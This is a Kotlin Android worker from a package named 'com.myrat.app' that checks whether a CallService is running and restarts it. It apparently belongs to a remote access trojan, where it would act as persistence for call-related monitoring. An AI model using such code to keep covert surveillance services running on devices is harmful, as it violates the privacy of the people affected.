package com.myrat.app.worker

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.myrat.app.service.CallService
import com.myrat.app.utils.Logger

class CallServiceRestartWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    
    override fun doWork(): Result {
        return try {
            Logger.log("🔄 CallServiceRestartWorker executing")
            
            // Check if CallService is running
            val activityManager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            val isCallServiceRunning = runningServices.any { 
                it.service.className == CallService::class.java.name 
            }
            
            if (!isCallServiceRunning) {
                Logger.log("📞 CallService not running, restarting...")
                
                val intent = Intent(applicationContext, CallService::class.java)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        applicationContext.startForegroundService(intent)
                    } else {
                        applicationContext.startService(intent)
                    }
                    
                    Logger.log("✅ CallService restart initiated via WorkManager")
                } catch (e: Exception) {
                    Logger.error("❌ Failed to start CallService", e)
                    return Result.retry()
                }
            } else {
                Logger.log("✅ CallService is already running")
            }
            
            Result.success()
        } catch (e: Exception) {
            Logger.error("❌ Failed to restart CallService via WorkManager", e)
            Result.retry()
        }
    }
}